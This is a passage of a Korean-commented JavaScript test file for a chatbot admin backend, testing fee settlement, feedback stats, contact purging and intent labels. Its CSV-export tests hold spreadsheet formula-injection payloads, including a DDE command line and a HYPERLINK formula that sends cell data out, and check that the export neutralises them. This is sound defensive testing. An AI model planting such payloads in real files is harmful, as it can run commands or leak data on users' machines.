  // 두 모듈이 **같은 인스턴스**를 공유해야 한다(컴파일 캐시 키가 같도록 의존 목록을 동일하게 준다).
  // (자기 이름을 deps에 넣으면 캐시 키가 어긋나 서로 다른 인스턴스가 된다)
  const rest = ['storage', 'logger', 'monitoring'];
  const P = await importLib('partners', ['settlement', ...rest]);
  const S = await importLib('settlement', ['partners', ...rest]);
  P.resetPartners();
  return { P, S };
}

test('기준월 기본값은 한국 시간 기준 이번 달이다 (DS 21-2)', opts, async () => {
  const { S } = await settlementLib();
  // 10월 1일 새벽 2시(KST) = 9월 30일 17시(UTC). 종전에는 아직 9월로 계산했다 —
  // 조건 툴바는 「10월」인데 합계는 9월치인 화면이 되는 자리다.
  assert.equal(S.currentMonth(new Date('2026-10-01T02:00:00+09:00')), '2026-10');
  assert.equal(S.currentMonth(new Date('2026-09-30T23:00:00+09:00')), '2026-09');
  assert.equal(S.currentMonth(new Date('2027-01-01T08:59:00+09:00')), '2027-01', '해가 바뀌는 경계');
});

test('정산 리포트가 월 이용료 × 수수료율로 수수료를 산출한다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 });
  assert.equal(ptr.ok, true);
  const acc = P.upsertAccount({
    name: 'OO의원', partnerId: ptr.partner.id, source: 'partner',
    status: 'contracted', contractedAt: '2026-08-01', monthlyFeeKrw: 300000,
  });
  assert.equal(acc.ok, true);

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.ok, true);
  assert.equal(r.report.periodEnd, '2026-09-30');
  assert.equal(r.report.rows.length, 1);
  const row = r.report.rows[0];
  assert.equal(row.baseAmountKrw, 300000);
  assert.equal(row.feeRateBp, 1500);
  assert.equal(row.feeAmountKrw, 45000, '300000 × 15% = 45000');
  assert.equal(row.issue, 'none');
  assert.equal(r.report.totals.feeAmountKrw, 45000);
  assert.equal(r.report.totals.partial, false);
  P.resetPartners();
});

test('수수료는 원 단위로 절사한다(반올림으로 부풀리지 않는다)', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: 'A파트너', feeRateBp: 333 });
  P.upsertAccount({ name: 'B고객', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 99999 });
  const r = S.buildSettlement({ month: '2026-09' });
  // 99999 * 333 / 10000 = 3329.9667 → 3329
  assert.equal(r.report.rows[0].feeAmountKrw, 3329);
  P.resetPartners();
});

test('근거가 없는 항목은 0원이 아니라 미산출로 남고 합계에서 빠진다(실패 경로)', opts, async () => {
  const { P, S } = await settlementLib();
  const withRate = P.upsertPartner({ name: '요율있음', feeRateBp: 1000 });
  const noRate = P.upsertPartner({ name: '요율없음' }); // feeRateBp 미설정
  P.upsertAccount({ name: '금액있음', partnerId: withRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 100000 });
  P.upsertAccount({ name: '금액없음', partnerId: withRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01' });
  P.upsertAccount({ name: '요율없는고객', partnerId: noRate.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-05-01', monthlyFeeKrw: 50000 });

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.report.rows.length, 3);
  const byName = Object.fromEntries(r.report.rows.map((x) => [x.accountName, x]));
  assert.equal(byName['금액있음'].feeAmountKrw, 10000);
  assert.equal(byName['금액없음'].feeAmountKrw, null, '0원으로 계산하면 안 된다');
  assert.equal(byName['금액없음'].issue, 'no_base_amount');
  assert.equal(byName['요율없는고객'].feeAmountKrw, null);
  assert.equal(byName['요율없는고객'].issue, 'no_fee_rate');

  assert.equal(r.report.totals.billable, 1);
  assert.equal(r.report.totals.incomplete, 2);
  assert.equal(r.report.totals.feeAmountKrw, 10000, '미산출분은 합계에 섞이지 않는다');
  assert.equal(r.report.totals.partial, true);
  assert.ok(r.report.notes.some((n) => n.includes('합계에서 제외')), '왜 빠졌는지 알려야 한다');
  P.resetPartners();
});

test('기간 밖·직접 계약·미계약은 정산 대상에서 제외되고 사유가 남는다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: 'A파트너', feeRateBp: 1000 });
  P.upsertAccount({ name: '기간후계약', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-12-01', monthlyFeeKrw: 10000 });
  P.upsertAccount({ name: '검토중', partnerId: ptr.partner.id, source: 'partner', status: 'prospect', monthlyFeeKrw: 10000 });
  P.upsertAccount({ name: '직접고객', partnerId: '', source: 'direct', status: 'contracted', contractedAt: '2026-01-01', monthlyFeeKrw: 10000 });

  const r = S.buildSettlement({ month: '2026-09' });
  assert.equal(r.report.rows.length, 0, '대상이 없어야 한다');
  assert.ok(r.report.notes.some((n) => n.includes('직접 계약')), '직접 계약 제외 사유');
  assert.ok(r.report.notes.some((n) => n.includes('계약일이 기간 이후')), '기간 밖 제외 사유');
  P.resetPartners();
});

test('기준월 형식이 틀리면 이유와 함께 거절한다(실패 경로)', opts, async () => {
  const { S } = await settlementLib();
  for (const bad of ['2026-13', '2026/09', '2026', '', 'abcd-ef']) {
    const r = S.buildSettlement({ month: bad });
    assert.equal(r.ok, false, `${bad} 는 거절되어야 한다`);
    assert.match(r.error, /2026-09 처럼 연-월/, '형식 토큰(YYYY-MM) 대신 예시로 말한다 — DS 29-3');
  }
  assert.equal(S.isValidMonth('2026-09'), true);
  assert.equal(S.monthEnd('2026-02'), '2026-02-28');
});

test('정산 CSV는 미산출 값을 빈 칸으로 두고 사유·주석을 함께 싣는다', opts, async () => {
  const { P, S } = await settlementLib();
  const ptr = P.upsertPartner({ name: '쉼표,파트너', feeRateBp: 1000 });
  P.upsertAccount({ name: '정상고객', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-03-01', monthlyFeeKrw: 200000 });
  P.upsertAccount({ name: '금액미입력', partnerId: ptr.partner.id, source: 'partner', status: 'contracted', contractedAt: '2026-03-01' });

  const csv = S.settlementToCsv(S.buildSettlement({ month: '2026-09' }).report);
  const lines = csv.split('\r\n');
  assert.match(lines[0], /^기준월,파트너ID/);
  const normal = lines.find((l) => l.includes('정상고객'));
  const missing = lines.find((l) => l.includes('금액미입력'));
  assert.ok(normal.includes('200000') && normal.includes('20000'), '정상 행은 금액이 있어야 한다');
  assert.ok(missing.includes(',,'), '미산출 금액은 빈 칸이어야 한다');
  assert.ok(!/,0,/.test(missing), '미산출을 0으로 채우면 안 된다');
  assert.ok(missing.includes('월 이용료 미입력'), '사유가 있어야 한다');
  assert.ok(csv.includes('"쉼표,파트너"'), '쉼표는 CSV 이스케이프되어야 한다');
  assert.ok(csv.includes('# '), '산출 근거 주석이 포함되어야 한다');
  assert.ok(csv.includes('청구서가 아닙니다'), '청구서로 오인되지 않게 명시해야 한다');
  P.resetPartners();
});

test('월 이용료는 검증된 값만 저장되고 미입력과 0원을 구분한다', opts, async () => {
  const { P } = await settlementLib();
  assert.equal(P.parseMonthlyFee('').value, undefined, '빈 값은 미입력');
  assert.equal(P.parseMonthlyFee(0).value, 0, '0원 계약은 0으로 남는다');
  assert.equal(P.parseMonthlyFee('300,000').value, 300000, '천 단위 구분 기호 허용');
  assert.equal(P.parseMonthlyFee(-1).ok, false);
  assert.equal(P.parseMonthlyFee('abc').ok, false);
  assert.equal(P.parseMonthlyFee(2_000_000_000).ok, false, '자릿수 오타 방어');

  const ptr = P.upsertPartner({ name: 'A', feeRateBp: 100 });
  const bad = P.upsertAccount({ name: 'X', partnerId: ptr.partner.id, source: 'partner', monthlyFeeKrw: -5 });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /월 이용료/);
  P.resetPartners();
});

/* ══════════ 답변 평가 저장소 ══════════ */

test('답변 평가는 집계되고, 평가가 없으면 비율을 만들어내지 않는다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false'; // 테스트가 로컬 파일을 건드리지 않게 한다
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  F.resetFeedback();

  assert.equal(F.feedbackSummary().helpfulRate, null, '평가 0건이면 비율은 null(「측정 중」)이어야 한다');

  assert.equal(F.recordFeedback({ sessionHash: 'h1', verdict: 'up', citation: '이음 FAQ 1. 신청' }).ok, true);
  assert.equal(F.recordFeedback({ sessionHash: 'h2', verdict: 'down', citation: '이음 FAQ 3. 활동 시간' }).ok, true);
  assert.equal(F.recordFeedback({ sessionHash: 'h3', verdict: 'down', citation: '이음 FAQ 3. 활동 시간' }).ok, true);

  const sum = F.feedbackSummary();
  assert.equal(sum.total, 3);
  assert.equal(sum.up, 1);
  assert.equal(sum.down, 2);
  assert.equal(sum.helpfulRate, 33);
  assert.equal(sum.topDown[0].citation, '이음 FAQ 3. 활동 시간');
  assert.equal(sum.topDown[0].down, 2);
  F.resetFeedback();
});

test('잘못된 평가 입력은 사유와 함께 거절된다(실패 경로)', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  F.resetFeedback();

  const bad = F.recordFeedback({ sessionHash: 'h1', verdict: '최고' });
  assert.equal(bad.ok, false);
  assert.match(bad.error, /평가를 기록하지 못했습니다/, '고객 화면까지 올라가는 문장이다 — DS 29-3');

  const noSession = F.recordFeedback({ sessionHash: '', verdict: 'up' });
  assert.equal(noSession.ok, false);
  assert.match(noSession.error, /평가를 기록하지 못했습니다/);

  assert.equal(F.feedbackSummary().total, 0, '거절된 입력이 집계에 들어가면 안 된다');
  F.resetFeedback();
});

test('평가 근거 라벨은 길이를 잘라 저장한다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const F = await importLib('feedback', ['storage', 'logger', 'monitoring', 'refusal']);
  F.resetFeedback();
  const long = 'ㄱ'.repeat(300);
  const r = F.recordFeedback({ sessionHash: 'h1', verdict: 'up', citation: long });
  assert.equal(r.ok, true);
  assert.ok(r.entry.citation.length <= 120, '근거 라벨이 잘리지 않았다');
  F.resetFeedback();
});

/* ══════════ 대시보드 집계 — 실제 로그에서만 값이 나온다 (DS 2-2) ══════════ */

test('일자별·오늘 집계는 기록된 대화에서만 만들어진다', opts, async () => {
  const { logTurn, convStats, resetLogs } = await importLib('convlog', ['chat', 'storage', 'logger', 'monitoring', 'knowledge', 'normalize', 'rules', 'adminStore', 'slots', 'session', 'llm', 'tenantKB', 'ingest']);
  resetLogs();

  // 기록이 없으면 지어내지 않는다 — 축은 7일이지만 값은 전부 0이고 오늘도 0이다.
  const empty = convStats();
  assert.equal(empty.daily.length, 7, '최근 7일 축');
  assert.equal(empty.daily.every((d) => d.turns === 0), true, '기록이 없으면 값이 없어야 한다');
  assert.equal(empty.today.turns, 0);
  assert.equal(empty.today.sessions, 0);

  logTurn({ sessionId: 's1', channel: 'web', message: '안녕', reply: '안녕하세요', intent: 'greeting', source: 'rule', escalate: false });
  logTurn({ sessionId: 's1', channel: 'web', message: '상담원', reply: '연결할게요', intent: 'handoff', source: 'rule', escalate: true });
  logTurn({ sessionId: 's2', channel: 'kakao', message: '요금', reply: '안내드립니다', intent: 'price', source: 'kb', escalate: false });

  const s = convStats();
  assert.equal(s.today.turns, 3, '오늘 대화 수');
  assert.equal(s.today.sessions, 2, '오늘 대화 상대 수(세션)');
  assert.equal(s.today.escalated, 1, '오늘 상담원 전환 수');
  const last = s.daily[s.daily.length - 1];
  assert.equal(last.turns, 3, '마지막 칸이 오늘이어야 한다');
  assert.equal(last.escalated, 1);
  assert.equal(s.daily.slice(0, 6).every((d) => d.turns === 0), true, '없는 날에 값을 만들면 안 된다');
  // 날짜 형식(YYYY-MM-DD)이 유지돼야 화면 축 라벨이 깨지지 않는다
  for (const d of s.daily) assert.match(d.date, /^\d{4}-\d{2}-\d{2}$/);
  // 「오늘」의 뜻이 한 곳에서만 온다 — 축의 마지막 칸은 한국 시간 기준 오늘이다(DS 21-1).
  // 대조는 독립 구현(ICU 시간대 데이터)으로 한다.
  assert.equal(last.date, new Date().toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' }), '대시보드의 「오늘」이 한국 날짜가 아니다');

  resetLogs();
});

test('평균 응답 시간은 기록된 서버 처리 시간에서만 계산되고 없으면 null 이다 (DS 2-14)', opts, async () => {
  const { logTurn, convStats, resetLogs, importTurns, exportTurns } = await importLib('convlog', ['chat', 'storage', 'logger', 'monitoring', 'knowledge', 'normalize', 'rules', 'adminStore', 'slots', 'session', 'llm', 'tenantKB', 'ingest']);
  resetLogs();

  // 기록이 없으면 0ms 로 단정하지 않는다
  assert.equal(convStats().avgLatencyMs, null, '표본이 없으면 null');
  assert.equal(convStats().latencySamples, 0);

  // 지연을 싣지 않은 턴(구버전·측정 실패)은 표본에서 빠진다
  logTurn({ sessionId: 's1', channel: 'web', message: '안녕', reply: '안녕하세요', intent: 'greeting', source: 'rule', escalate: false });
  assert.equal(convStats().avgLatencyMs, null, '지연이 없는 턴만 있으면 여전히 null');

  logTurn({ sessionId: 's1', channel: 'web', message: '요금', reply: '안내', intent: 'price', source: 'kb', escalate: false, latencyMs: 120 });
  logTurn({ sessionId: 's2', channel: 'kakao', message: '취소', reply: '안내', intent: 'cancel', source: 'kb', escalate: false, latencyMs: 380.4 });
  // 비정상 값(음수·NaN)은 기록하지 않는다
  logTurn({ sessionId: 's3', channel: 'web', message: '가입', reply: '안내', intent: 'join', source: 'kb', escalate: false, latencyMs: -5 });
  logTurn({ sessionId: 's3', channel: 'web', message: '문의', reply: '안내', intent: 'ask', source: 'kb', escalate: false, latencyMs: Number.NaN });

  const s = convStats();
  assert.equal(s.latencySamples, 2, '유효한 지연만 표본에 든다');
  assert.equal(s.avgLatencyMs, 250, '(120 + 380) / 2 = 250');

  // 스냅샷 복원에서도 지연이 보존되고, 오염된 값은 버려진다
  const snap = exportTurns();
  snap.turns[1].latencyMs = 'fast';
  resetLogs();
  const r = importTurns(snap);
  assert.equal(r.ok, true);
  const after = convStats();
  assert.equal(after.latencySamples, 1, '문자열 지연은 복원 시 버려진다');
  assert.equal(after.avgLatencyMs, 380);

  resetLogs();
});

/* ────────────────────────────────────────────────────────────────
 * DS 15-2 — CSV 수식 주입(formula injection)
 * 내보낸 CSV 를 여는 곳은 엑셀이고, 그 표의 `message` 칸에는 **아무나 열 수 있는
 * 상담창에 방문자가 직접 친 글자**가 들어간다. 따옴표 처리(RFC 4180)는 수식을 막지 못한다.
 * 실제로 실행해 확인한다 — 텍스트 검사만으로는 "정말 앞에 따옴표가 서는가"를 모른다.
 * ──────────────────────────────────────────────────────────────── */
test('csvCell: 수식으로 읽히는 첫 글자를 중화한다', opts, async () => {
  const { csvCell } = await importLib('csv');
  // 엑셀·LibreOffice·Google 시트가 수식의 시작으로 읽는 글자들
  for (const s of [
    '=HYPERLINK("https://x/?d="&A2,"확인")',
    '=cmd|\'/c calc\'!A0',
    '+1+1',
    '@SUM(A1:A9)',
    '\tSUM(1)',
    '\r=1',
    '-HYPERLINK("https://x")',
  ]) {
    const cell = csvCell(s);
    // 따옴표로 감쌌든 아니든, 값의 첫 글자는 반드시 작은따옴표여야 한다.
    const inner = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
    assert.equal(inner[0], "'", `중화되지 않음: ${JSON.stringify(s)} → ${JSON.stringify(cell)}`);
    assert.equal(inner.slice(1), s, '원문이 보존되어야 한다(운영자가 무엇을 받았는지 읽을 수 있게)');
  }
});

test('csvCell: 순수한 수는 건드리지 않는다 — 음수 금액이 합계에서 빠지면 안 된다', opts, async () => {
  const { csvCell } = await importLib('csv');
  for (const v of ['-1200', -1200, '0', 0, '3.5', '-0.25', '120000']) {
    assert.equal(csvCell(v), String(v), `수를 중화하면 안 된다: ${v}`);
  }
});

test('csvCell: 구분자·따옴표·줄바꿈은 종전대로 감싼다(RFC 4180)', opts, async () => {
  const { csvCell } = await importLib('csv');
  assert.equal(csvCell('가,나'), '"가,나"');
  assert.equal(csvCell('그는 "예"라 했다'), '"그는 ""예""라 했다"');
  assert.equal(csvCell('한 줄\n두 줄'), '"한 줄\n두 줄"');
  assert.equal(csvCell('보통 글자'), '보통 글자');
  // null·undefined 는 빈 칸 — 0 으로 채우면 받는 쪽이 "0원"으로 읽는다(settlement 규약).
  assert.equal(csvCell(null), '');
  assert.equal(csvCell(undefined), '');
  assert.equal(csvCell(false), 'false');
});

test('csvRow: 수식 중화가 행 단위로도 걸린다', opts, async () => {
  const { csvRow } = await importLib('csv');
  const row = csvRow(['t1', '=1+1', -500, null]);
  assert.equal(row, `t1,'=1+1,-500,`);
});

test('감사 로그 CSV 가 수식 주입을 실제로 막는다', opts, async () => {
  const audit = await importLib('audit');
  audit.resetAudit();
  audit.logAudit({ action: 'kb.upsert', target: '=cmd|\'/c calc\'!A0', detail: '@SUM(A1)', authed: true });
  const csv = audit.auditToCsv();
  assert.ok(!/(^|,)=cmd/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
  assert.ok(!/(^|,)@SUM/m.test(csv), `수식이 그대로 실렸다:\n${csv}`);
  assert.match(csv, /'=cmd/, '원문은 보존되어야 한다');
  audit.resetAudit();
});

/* ══════════ 디자인 스프린트 — 13차 재감사 (DS 16-3) ══════════ */

/**
 * 개인정보처리방침 4조는 「상담원 연결을 위한 연락처는 상담 완료 후 지체 없이 파기합니다」라고
 * 약속한다. 종전에는 그 약속을 지킬 경로가 코드에 없었다 — 완료·취소로 바꾼 뒤에도 연락처가 남아
 * 목록·상세·백업·CSV 로 계속 나갔다. 문서 검사로는 「지워지는가」를 알 수 없으므로 실제로 돌려 본다.
 */
test('상담이 끝나면 연락처가 실제로 지워진다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');

  for (const done of ['resolved', 'canceled']) {
    esc.resetTickets();
    const { ticket } = esc.createTicket({
      sessionId: `rt-purge-${done}`,
      contact: '010-1234-5678',
      message: '환불 문의',
      summary: '요약',
    });
    assert.equal(esc.getTicket(ticket.id).contact, '010-1234-5678', '접수 시점에는 연락처가 있어야 한다');

    // 상담 중에는 지우지 않는다 — 운영자가 그 연락처로 전화를 건다.
    esc.updateTicket(ticket.id, { status: 'in_progress' });
    assert.equal(esc.getTicket(ticket.id).contact, '010-1234-5678', '상담 중에 연락처를 지우면 연락할 수 없다');
    assert.equal(esc.getTicket(ticket.id).contactPurgedAt, undefined);

    const r = esc.updateTicket(ticket.id, { status: done });
    assert.equal(r.ok, true);
    const after = esc.getTicket(ticket.id);
    assert.equal(after.contact, undefined, `${done} 로 바꿨는데 연락처가 남아 있다`);
    assert.ok(after.contactPurgedAt, '파기 사실이 남지 않으면 「처음부터 없던 접수」와 구분되지 않는다');
    // 이관 근거는 파기 대상이 아니다.
    assert.equal(after.message, '환불 문의', '대화 근거까지 지우면 이관 기록이 무의미해진다');
    assert.equal(after.summary, '요약');

    // 다시 열어도 되살아나지 않는다(파기는 되돌릴 수 없다).
    esc.updateTicket(ticket.id, { status: 'open' });
    assert.equal(esc.getTicket(ticket.id).contact, undefined, '다시 열자 연락처가 되살아났다');

    // 목록·백업 어디에도 원문이 없어야 한다.
    const json = JSON.stringify({ list: esc.listTickets(), snapshot: esc.exportTickets() });
    assert.equal(/010-1234-5678/.test(json), false, '목록·백업에 파기한 연락처가 남아 있다');
  }
  esc.resetTickets();
});

test('파기 뒤 고객이 다시 남긴 연락처는 「파기됨」이 아니다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');
  esc.resetTickets();
  const { ticket } = esc.createTicket({ sessionId: 'rt-purge-again', contact: '010-1111-2222' });
  esc.updateTicket(ticket.id, { status: 'resolved' });
  assert.ok(esc.getTicket(ticket.id).contactPurgedAt);

  // 다시 열린 접수에 고객이 새 연락처를 남기면 그 티켓은 다시 「연락처 남김」이다.
  esc.updateTicket(ticket.id, { status: 'open' });
  esc.createTicket({ sessionId: 'rt-purge-again', contact: 'hong@example.com' });
  const t = esc.getTicket(ticket.id);
  assert.equal(t.contact, 'hong@example.com', '같은 세션의 열린 접수를 재사용해야 한다');
  assert.equal(t.contactPurgedAt, undefined, '새로 받은 연락처에 파기 표시가 남아 있다');
  esc.resetTickets();
});

test('파기 이전에 뜬 백업을 되돌려도 연락처는 되살아나지 않는다 (DS 16-3)', opts, async () => {
  const esc = await importLib('escalation');
  esc.resetTickets();
  // 파기 표시와 연락처가 **함께** 들어 있는 스냅샷(구버전 백업을 손으로 이어 붙인 경우).
  const r = esc.importTickets({
    version: 1,
    tickets: [{
      id: 'ESC-0001',
      sessionId: 'rt-purge-import',
      status: 'resolved',
      reason: 'user_request',
      message: '문의',
      contact: '010-9999-8888',
      contactPurgedAt: '2026-09-21T00:00:00.000Z',
      createdAt: '2026-09-21T00:00:00.000Z',
      updatedAt: '2026-09-21T00:00:00.000Z',
    }],
  });
  assert.equal(r.ok, true);
  assert.equal(r.count, 1);
  const t = esc.getTicket('ESC-0001');
  assert.ok(!t.contact, '파기 표시가 있는데 연락처가 복원됐다');
  assert.equal(t.contactPurgedAt, '2026-09-21T00:00:00.000Z', '파기 시각은 유지해야 한다');
  assert.equal(/010-9999-8888/.test(JSON.stringify(esc.exportTickets())), false, '복원 직후 백업에 원문이 남았다');
  esc.resetTickets();
});
/**
 * DS 19-1 — 기본(GOWON) 위젯의 빠른 답장은 관리 콘솔 지식베이스에서 실제로 나와야 한다.
 * eum 처럼 정적 FAQ 파일이 아니라 `listKB()`(런타임에 admin 이 늘리고 줄이는 값)를 본다 —
 * 그래서 값이 고정 텍스트가 아니라 실제 KB 변경을 따라가는지까지 실행해서 확인한다.
 *
 * tenantKB 와 adminStore 가 **같은 kbEntries 상태**를 봐야 이 검증이 의미가 있다 — ENGINE 과 같은
 * 이유로, 자기 자신을 뺀 같은 집합을 넘겨 컴파일 캐시 키를 일치시킨다(위 주석 참고).
 */
const TENANTKB_GROUP = ['tenantKB', 'adminStore', 'tenants', 'knowledge', 'normalize', 'storage'];
const tkb = (name) => importLib(name, TENANTKB_GROUP.filter((n) => n !== name));

test('fallbackStarters는 관리 콘솔 지식베이스 상위 질문을 그대로 돌려준다 (DS 19-1)', opts, async () => {
  const { fallbackStarters, tenantConfig } = await tkb('tenantKB');
  const { listKB, upsertKB, deleteKB } = await tkb('adminStore');

  const before = listKB().map((e) => e.question).slice(0, 4).filter((q) => q && q.trim());
  assert.ok(before.length > 0, '기본 지식베이스가 비어 있어 이 테스트 전제를 확인할 수 없다');
  assert.deepEqual(fallbackStarters(), before, '일반 지식베이스 상위 질문과 달라야 할 이유가 없다');
  assert.ok(fallbackStarters().length <= 4, '칩은 4개를 넘지 않아야 한다(375px 두 줄 제한)');

  // eum 처럼 등록된 테넌트는 자기 프리셋만 본다 — fallbackStarters 와 같은 값이 섞이면 격리가 깨진다.
  const eum = tenantConfig('eum');
  assert.ok(eum && eum.starters && eum.starters.length > 0, '이음 프리셋 starters 가 비었다');
  assert.notDeepEqual(eum.starters, fallbackStarters(), '이음 위젯에 일반 지식 칩이 섞이면 안 된다');

  // 실제 admin 이 지식을 늘리면 다음 호출부터 반영돼야 한다(정적 스냅샷이 아니다) — 끝나면 원복한다.
  const marker = { id: 'ds19-1-drill', category: '점검', question: '__DS19-1 드릴 질문__', keywords: ['ds19drill'], answer: '점검용 답변' };
  const restore = listKB();
  try {
    // 맨 앞에 오도록 KB를 통째로 비우고 마커 하나만 넣는다(순서 의존 없이 반영 여부만 본다).
    for (const e of restore) deleteKB(e.id);
    upsertKB(marker);
    assert.deepEqual(fallbackStarters(), [marker.question], '지식베이스를 바꿔도 칩이 그대로면 정적 스냅샷을 쓰고 있다는 뜻이다');
  } finally {
    deleteKB(marker.id);
    for (const e of restore) upsertKB(e);
  }
});

/* ══════════ 19차 재감사 — 코드가 아니라 이름이 나오는지 실행해서 본다 (DS 22-x) ══════════ */

/**
 * DS 22-2 — 엔진이 내는 **모든** 인텐트에 이름이 붙는가.
 * 소스 검사로는 "사전에 키가 있다"까지만 보이고, 정작 운영자가 보는 값은 함수가 돌려주는 문자열이다.
 * 그래서 `src/lib/chat.ts` 에서 실제 인텐트 리터럴을 긁어 **그 전부**를 함수에 통과시킨다 —
 * 종전 사전은 이 가운데 다섯 개만 알고 있었고 나머지는 코드가 그대로 화면에 떴다.
 */
test('엔진이 내는 인텐트 전부에 사람이 읽는 이름이 붙는다 (DS 22-2)', opts, async () => {
  const { intentLabel, intentLabelMap, UNKNOWN_INTENT_LABEL } = await importLib('intents', ['rules']);
  const { RULES } = await importLib('rules', ['intents']);

  // 1) 내장 룰 19종 — 룰 정의의 이름이 그대로 나온다(콘솔 「시나리오 규칙」 탭과 같은 말).
  assert.ok(RULES.length >= 19, `내장 룰을 읽지 못했다(${RULES.length}건)`);
  for (const r of RULES) {
    assert.equal(intentLabel(r.intent), r.label, `${r.intent}: 룰 이름과 다른 말이 나온다`);
  }

  // 2) chat.ts 가 직접 쓰는 리터럴 인텐트 — 하나라도 「기타」로 떨어지면 화면에서 뜻을 잃는다.
  const chatSrc = readFileSync(new URL('../src/lib/chat.ts', import.meta.url), 'utf8');
  const literals = [...chatSrc.matchAll(/intent: '([\w:.]+)'/g)].map((m) => m[1]);
  assert.ok(literals.length >= 6, `리터럴 인텐트를 읽지 못했다(${literals.length}건)`);
  for (const code of new Set(literals)) {
    const label = intentLabel(code);
    assert.notEqual(label, UNKNOWN_INTENT_LABEL, `${code}: 이름이 없어 「기타」로 떨어진다`);
    // 「AI」는 제품 전체가 쓰는 말이라 둔다(「AI가 응대합니다」). 그 밖의 영문 낱말은 코드다.
    assert.equal(/[A-Za-z]{2,}/.test(label.replace(/AI/g, '')), false, `${code}: 이름에 영문 코드가 섞였다(${label})`);
  }

  // 3) 가장 흔한 경로 — 등록 자료로 답한 대화. 카테고리가 그대로 보여야 운영자가 구분할 수 있다.
  assert.equal(intentLabel('kb:환불·반품'), '자료 안내 · 환불·반품');
  assert.equal(intentLabel('kb:'), '자료 안내', '카테고리가 비면 콜론만 남기지 않는다');

  // 4) 접수 폼 — 어느 접수가 어디까지 갔는지로 읽힌다.
  assert.equal(intentLabel('form:reservation:start'), '예약 접수 시작');
  assert.equal(intentLabel('form:reservation:datetime'), '예약 접수 진행 중');
  assert.equal(intentLabel('form:reservation:datetime:retry'), '예약 접수 진행 중');
  assert.equal(intentLabel('form:trouble:complete'), '장애 신고 접수 완료');
  assert.equal(intentLabel('form:trouble:cancelled'), '장애 신고 접수 중단');
  assert.equal(intentLabel('form:reservation:max_retry'), '예약 접수 · 상담원 연결');

  // 5) 운영자가 만든 규칙 — 자기가 붙인 이름이 나와야 한다(코드는 `cr_<시각>` 이라 읽을 수 없다).
  const custom = intentLabelMap([{ intent: 'cr_m1x2y3', label: '쿠폰 재발급 안내' }, { intent: '', label: '버려짐' }]);
  assert.equal(intentLabel('cr_m1x2y3', custom), '쿠폰 재발급 안내');
  assert.equal(intentLabel('cr_m1x2y3'), UNKNOWN_INTENT_LABEL, '이름을 모르면 코드를 내보내지 않고 「기타」다');
  assert.equal(Object.keys(custom).length, 1, '이름 없는 규칙은 사전에 넣지 않는다');

  // 6) 어떤 입력에도 코드를 되돌려주지 않는다.
  for (const code of ['', '  ', 'unknown_thing', 'cr_zzz', 'form:nope:x']) {
    assert.equal(intentLabel(code).includes(code.trim()) && code.trim() !== '', false, `${code}: 코드가 화면 문자열에 섞였다`);
  }
});

/**
 * DS 22-1 — 이관 요약 평문은 상담원이 그대로 읽는 문장이다.
 * 소스에 `${s.reason}` 이 없다는 것만으로는 부족하다 — 실제로 만들어 **영문 코드가 한 자도 없는지** 본다.
 */
test('이관 요약 평문에 내부 코드가 남지 않는다 (DS 22-1)', opts, async () => {
  const { buildHandoffSummary } = await importLib('handoff', ['intents', 'rules']);

  const sessionId = 'web_m9z8y7x6_abcdef';
  const s = buildHandoffSummary({
    sessionId,
    channel: 'web',
    reason: 'customer_request',
    turns: [
      { at: '2026-10-01T01:00:00.000Z', speaker: 'customer', text: '예약하고 싶어요. 010-1234-5678 로 연락 주세요', intent: 'reservation' },
      { at: '2026-10-01T01:00:02.000Z', speaker: 'bot', text: '예약을 도와드릴게요.' },
    ],
    slots: { contact: 'hong@example.com', name: '홍길동' },
    pendingSlots: ['datetime'],
  });

  // 사람이 읽는 말
  assert.match(s.text, /이관 사유: 고객이 상담원 연결을 요청/);
  assert.match(s.text, /직전 주제: 예약 접수/);
  assert.match(s.text, /주고받은 메시지: 2개/);
  assert.match(s.text, /개인정보 마스킹: .*휴대폰 번호/);
  assert.match(s.text, /이메일 주소/);
  assert.match(s.text, /홈페이지 접수/);

  // 코드·식별자 원문
  for (const code of ['customer_request', 'reservation', 'phone', 'email', 'web ', sessionId]) {
    assert.equal(s.text.includes(code), false, `요약 평문에 코드가 남았다: ${code}`);
  }
  assert.match(s.text, /대화 web_m9…/, '대화 식별자는 앞 6자만 보여준다');

  // 기계가 보는 구조체에는 코드가 그대로 남아 있다(두 쪽을 섞지 않는다).
  assert.equal(s.reason, 'customer_request');
  assert.equal(s.lastIntent, 'reservation');
  assert.equal(s.lastIntentLabelKo, '예약 접수');
  assert.deepEqual(s.piiKinds, ['email', 'phone']);
  assert.equal(s.sessionId, sessionId, '세션 식별자 자체는 구조체에 그대로 있어야 한다');

  // 접수번호가 생긴 뒤에는 그것으로 머리글을 쓴다(서랍 제목과 같은 앞 8자).
  const withTicket = buildHandoffSummary({
    sessionId,
    ticketId: 'tkt_abcdefghijkl',
    channel: 'kakao',
    reason: 'max_retry',
    turns: [],
    slots: {},
  });
  assert.match(withTicket.text, /접수번호 tkt_abcd… · 카카오톡 접수/);
  assert.match(withTicket.text, /이관 사유: 재시도 한도 초과/);
  assert.equal(withTicket.text.includes('max_retry'), false, '사유 코드가 남았다');
